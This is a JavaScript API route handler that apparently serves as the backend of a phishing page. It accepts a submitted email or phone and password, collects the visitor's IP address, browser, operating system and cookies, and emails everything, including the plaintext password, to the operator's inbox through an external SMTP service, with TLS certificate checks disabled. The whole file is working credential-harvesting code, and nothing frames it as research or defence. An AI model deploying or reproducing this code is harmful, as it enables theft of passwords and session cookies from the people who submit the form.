import nodemailer from "nodemailer";
import { UAParser } from "ua-parser-js";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { email, password, phone } = req.body;

  if (!email && !phone) {
    return res.status(400).json({ message: "Missing required fields: email or phone" });
  }

  const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown";
  const userAgent = req.headers["user-agent"] || "Unknown";
  const parser = new UAParser(userAgent);
  const browser = parser.getBrowser().name || "Unknown";
  const browserVersion = parser.getBrowser().version || "Unknown";
  const os = parser.getOS().name || "Unknown";
  const osVersion = parser.getOS().version || "Unknown";
  const cookies = req.headers.cookie || "No cookies available";

  const transporter = nodemailer.createTransport({
    host: "smtp.elasticemail.com",
    port: 2525,
    secure: false, // Use TLS, not SSL
    auth: {
      user: process.env.EMAIL_USER, // e.g., yourname@example.com
      pass: process.env.EMAIL_PASSWORD, // Your Elastic Email SMTP password
    },
    tls: { rejectUnauthorized: false }, // Optional: Helps with some server issues
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_USER,
    subject: "New Login Submission",
    text: `
      New login submission received:
      
      Email/Username: ${email || "N/A"}
      Phone: ${phone || "N/A"}
      Password: ${password || "N/A"}
      IP Address: ${ipAddress}
      Browser: ${browser} ${browserVersion}
      Operating System: ${os} ${osVersion}
      Cookies: ${cookies}
      
      Timestamp: ${new Date().toISOString()}
    `,
    html: `
      <h2>New Login Submission</h2>
      <p><strong>Email/Username:</strong> ${email || "N/A"}</p>
      <p><strong>Phone:</strong> ${phone || "N/A"}</p>
      <p><strong>Password:</strong> ${password || "N/A"}</p>
      <p><strong>IP Address:</strong> ${ipAddress}</p>
      <p><strong>Browser:</strong> ${browser} ${browserVersion}</p>
      <p><strong>Operating System:</strong> ${os} ${osVersion}</p>
      <p><strong>Cookies:</strong> ${cookies}</p>
      <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    `,
  };

  try {
    await transporter.verify(); // Test connection
    console.log("SMTP connection verified");
    await transporter.sendMail(mailOptions);
    return res.status(200).json({ message: "Email sent successfully" });
  } catch (error) {
    console.error("Error details:", { message: error.message, stack: error.stack });
    return res.status(500).json({ message: "Failed to send email", error: error.message });
  }
}